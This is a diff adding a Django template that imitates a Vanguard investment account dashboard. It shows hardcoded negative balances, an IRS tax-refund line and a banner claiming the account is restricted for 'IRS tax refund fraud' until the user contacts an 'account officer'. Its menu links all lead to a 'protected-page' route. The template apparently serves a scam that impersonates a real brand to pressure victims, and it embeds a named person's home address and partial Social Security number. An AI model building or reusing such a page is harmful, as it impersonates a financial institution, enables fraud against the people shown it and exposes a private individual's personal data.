@@ -1,0 +1,330 @@
+{% load static %}
+{% load tz %}
+{% load i18n %}
+
+
+<!-- {% comment %} {% localtime on %}
+{{ user.last_login|date:"l, F j, Y g:i a" }},
+{% get_current_timezone as TIME_ZONE %}
+{{ TIME_ZONE }} time
+{% endlocaltime %} {% endcomment %} -->
+
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static "css/style.css" %}">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.7/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-LN+7fdVzj6u52u30Kp6M/trliBMCMKTyK833zpbD+pXdCLuTusPj697FH4R/5mcr" crossorigin="anonymous">
+
+    <!-- Include SweetAlert CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
+</head>
+
+<body>
+    <!-- Navbar -->
+    <nav class="navbar container-fluid">
+        <div class="navbar__container ">
+            <h1 id="navbar__logo">Vanguard</h1>
+            <div class="navbar__toggle" id="mobile-menu">
+                <span class="bar"></span>
+                <span class="bar"></span>
+                <span class="bar"></span>
+            </div>
+            <ul class="navbar__menu">
+                <li class="navbar__item">
+                    <a href="#" class="navbar__links acc">My accounts<br>
+                        <span>Address:26602 N Heaton Ln<br>
+                            Magnolia, TX 77355<br>
+                            Name:Jerry P Leatherwood<br>
+                            Ssn xxx-xx-xx98</span></a>
+                </li>
+                <li class="navbar__item">
+                    <a href="{% url 'protected-page' %}" class="navbar__links off ">What we offer</a>
+                </li>
+                <li class="navbar__item">
+                    <a href="{% url 'protected-page' %}" class="navbar__links">Why we are different</a>
+                </li>
+                <li class="navbar__item">
+                    <a href="{% url 'protected-page' %}" class="navbar__links">Get smart about investing</a>
+                </li>
+
+                <li class="navbar__item">
+                    <a href="{% url 'protected-page' %}" class="navbar__links">Notifications <i
+                            class=" fa-solid fa-envelope"></i></a>
+                </li>
+
+                {% if request.user.is_authenticated %}
+                <li class="navbar__item">
+                    <a href="{% url "logout" %}" class="navbar__links">Logout <i class=" fa-solid fa-lock"></i></a>
+                </li>
+                {% endif %}
+
+            </ul>
+        </div>
+    </nav>
+
+
+
+<!-- 
+    <div class="first container-fluid">
+        <div class="first__container row  col-lg-12  col-md-8 col-sm-8 col-xl-12">
+            <h1>
+                Welcome back, {{ user.username }}<br>
+                <span>-$5000, 708.00</span>
+            </h1>
+            <p>
+                Value as of: 07/25/2025, 1:30 p.m. Eastern time<br>
+                Last logon on:
+                {% if user.last_login %}
+                {% localtime on %}
+                {{ user.last_login|date:"l, F j, Y g:i a" }},
+                Eastern time
+                {% endlocaltime %}
+                {% else %}
+                Never logged in
+                {% endif %}
+            </p>
+            <div class="paras">
+                <p class="para">⛔A restriction have been placed on your vanguard investment account<br>
+                    due to IRS tax refund fraud policy,contact your account officer <br>
+                    to get problem solved and money available for withdrawal.</p>
+            </div>
+        </div>
+    </div>
+ -->
+
+<!-- 
+    <div class="transact container col-lg-12  col-md-8 col-sm-8  col-xl-12 d-flex justify-content center">
+        <div class="transact__container row col-lg-12  col-md-8 col-sm-8 col-xl-12 ">
+            <ul class="transact__menu col-lg-12 col-md-8  ">
+                <li class="transact__item ">
+                    <a href="{% url 'protected-page' %}" class="transact__links ">Balances</a>
+                </li>
+                <li class="transact__item">
+                    <a href="{% url 'protected-page' %}" class="transact__links">Holdings</a>
+                </li>
+                <li class="transact__item">
+                    <a href="{% url 'protected-page' %}" class="transact__links">Activities</a>
+                </li>
+                <li class="transact__item">
+                    <a href="{% url 'protected-page' %}" class="transact__links">Performance</a>
+                </li>
+                <li class="transact__item">
+                    <a href="{% url 'protected-page' %}" class="transact__links">Portfolio Watch</a>
+                </li>
+
+            </ul>
+
+            <div class="download col-lg-12 col-xl-12"><a href="{% url 'protected-page' %}">Download Center</a></div>
+
+            {% if accounts %}
+            {# Display the first account separately #}
+            {% with account=accounts.first %}
+            {% if account %}
+            <div class="container_bold col-lg-12 col-md-8 col-sm-8 col-xl-12">
+                <a href="{% url 'protected-page' %}" class="self">Self-managed accounts</a>
+                <a href="{% url 'protected-page' %}" class="">-$402,708.00</a>
+            </div>
+            {% endif %}
+            {% endwith %}
+
+            {# Loop through remaining accounts (excluding first) #}
+            {% for account in accounts|slice:"1:" %}
+            <div class="container col-lg-12 col-md-8 col-sm-8 col-xl-12">
+                <a href="{% url 'protected-page' %}" class="self">
+                    {{ account.account_type }}-{{ account.account_number }}
+                </a>
+                <a href="{% url 'protected-page' %}" class="">
+                    {{ account.display_balance }}
+                </a>
+            </div>
+            {% endfor %}
+            {% endif %}
+
+            <div class="container_bold2  col-lg-12  col-md-8 col-sm-8 col-xl-12">
+                <span class="self">Total Vanguard assets</span>
+                <a href="{% url 'protected-page' %}" class="">
+                    {% if totals.user_total %}
+                    {{ totals.user_total }}
+                    {% endif %}
+                </a>
+            </div>
+
+            <div class="container-blue  col-lg-12  col-md-8 col-sm-8 col-xl-12">
+                <a href="{% url 'protected-page' %}" class="self">Balance by date</a>
+                <a href="{% url 'protected-page' %}" class=" sum ">Go to Holdings Summary</a>
+            </div>
+        </div>
+
+    </div>
+ -->
+
+
+
+
+
+
+    <!-- First page -->
+    <div class="first container-fluid">
+        <div class="first__container row  col-lg-12  col-md-8 col-sm-8 col-xl-12">
+            <h1>
+                Welcome back, {{ user.username }}<br>
+                <span>-$402, 708.00</span>
+            </h1>
+            <p>
+                Value as of: 07/25/2025, 1:30 p.m. Eastern time<br>
+                Last logon on: {% if user.last_login %}
+                {% localtime on %}
+                {{ user.last_login|date:"l, F j, Y g:i a" }},
+                Eastern time
+                {% endlocaltime %}
+                {% else %}
+                Never logged in
+                {% endif %}
+            </p>
+            <div class="paras">
+                <p class="para">⛔A restriction have been placed on your vanguard investment account<br>
+                    due to IRS tax refund fraud policy,contact your account officer <br>
+                    to get problem solved and money available for withdrawal.</p>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- Transaction container -->
+    <div class="transact container col-lg-12  col-md-8 col-sm-8  col-xl-12 d-flex justify-content center">
+        <div class="transact__container row col-lg-12  col-md-8 col-sm-8 col-xl-12 ">
+            <ul class="transact__menu col-lg-12 col-md-8  ">
+                <li class="transact__item ">
+                    <a href="{% url 'protected-page' %}" class="transact__links ">Balances</a>
+                </li>
+                <li class="transact__item">
+                    <a href="{% url 'protected-page' %}" class="transact__links">Holdings</a>
+                </li>
+                <li class="transact__item">
+                    <a href="{% url 'protected-page' %}" class="transact__links">Activities</a>
+                </li>
+                <li class="transact__item">
+                    <a href="{% url 'protected-page' %}" class="transact__links">Performance</a>
+                </li>
+                <li class="transact__item">
+                    <a href="{% url 'protected-page' %}" class="transact__links">Portfolio Watch</a>
+                </li>
+
+            </ul>
+
+            <div class="download col-lg-12 col-xl-12"><a href="{% url 'protected-page' %}">Download Center</a></div>
+
+            <div class="container_bold  col-lg-12  col-md-8 col-sm-8 col-xl-12">
+                <a href="{% url 'protected-page' %}" class="self">Self-managed accounts</a>
+                <a href="{% url 'protected-page' %}" class="">-$402,708.00</a>
+            </div>
+
+            <div class="container  col-lg-12  col-md-8 col-sm-8 col-xl-12">
+                <a href="{% url 'protected-page' %}" class="self">Merge Partnership-Brokerage-46894422*</a>
+                <a href="{% url 'protected-page' %}" class="">-$55,200.01</a>
+
+            </div>
+
+            <div class="container  col-lg-12  col-md-8 col-sm-8 col-xl-12">
+                <a href="{% url 'protected-page' %}" class="self">AC-IRS TREAS 310-TAX REF</a>
+                <a href="{% url 'protected-page' %}" class="">-$402,708.00</a>
+            </div>
+
+            <div class="container  col-lg-12  col-md-8 col-sm-8 col-xl-12">
+                <a href="{% url 'protected-page' %}" class="self">DoeJane-UTMA Brokerage-72577866*</a>
+                <a href="{% url 'protected-page' %}" class="">-$43,105.00</a>
+            </div>
+
+            <div class="container  col-lg-12  col-md-8 col-sm-8 col-xl-12">
+                <a href="{% url 'protected-page' %}" class="self">DoeJane-UTMA Brokerage-84309004*</a>
+                <a href="{% url 'protected-page' %}" class="">$227,089.00</a>
+            </div>
+
+            <div class="container  col-lg-12  col-md-8 col-sm-8 col-xl-12">
+                <a href="{% url 'protected-page' %}" class="self">DoeJane-Brokerage-29859210</a>
+                <a href="{% url 'protected-page' %}" class="">$66,807.00</a>
+            </div>
+
+            <div class="container_bold2  col-lg-12  col-md-8 col-sm-8 col-xl-12">
+                <span class="self">Total Vanguard assets</span>
+                <span class="">$145,200.01</span>
+            </div>
+
+            <div class="container-blue  col-lg-12  col-md-8 col-sm-8 col-xl-12">
+                <a href="{% url 'protected-page' %}" class="self">Balance by date</a>
+                <a href="{% url 'protected-page' %}" class=" sum ">Go to Holdings Summary</a>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Scripts -->
+    <script src="{% static "js/app.js" %}"></script>
+    <script src="https://kit.fontawesome.com/af5051bfc9.js" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- SweetAlert JS -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <!-- Universal Message Handler -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            {% if messages %}
+            {% for message in messages %}
+            Swal.fire({
+                icon: '{{ message.tags }}' === 'error' ? 'error' : 'success',
+                title: '{{ message.tags }}' === 'error' ? 'Oops' : '{{ message.tags|title }}',
+                text: '{{ message|escapejs }}',
+                confirmButtonText: 'OK',
+                allowOutsideClick: false,
+                allowEscapeKey: false,
+                timer: 10000,
+                timerProgressBar: true,
+            });
+            {% endfor %}
+            {% endif %}
+        });
+    </script>
+
+    <!-- AJAX Handler (if needed) -->
+    <script>
+        function handleProtectedRequest() {
+            fetch("{% url 'protected-page' %}", {
+                headers: {
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'X-CSRFToken': '{{ csrf_token }}'
+                }
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        return response.json().then(err => { throw err; });
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    if (data.status === 'error') {
+                        Swal.fire({
+                            icon: 'error',
+                            title: 'Access Denied',
+                            text: data.message,
+                            confirmButtonText: 'OK'
+                        });
+                    }
+                })
+                .catch(error => {
+                    Swal.fire({
+                        icon: 'error',
+                        title: 'Error',
+                        text: error.message || 'Request failed',
+                        confirmButtonText: 'OK'
+                    });
+                });
+        }
+    </script>
+
+</body>
+
+</html>
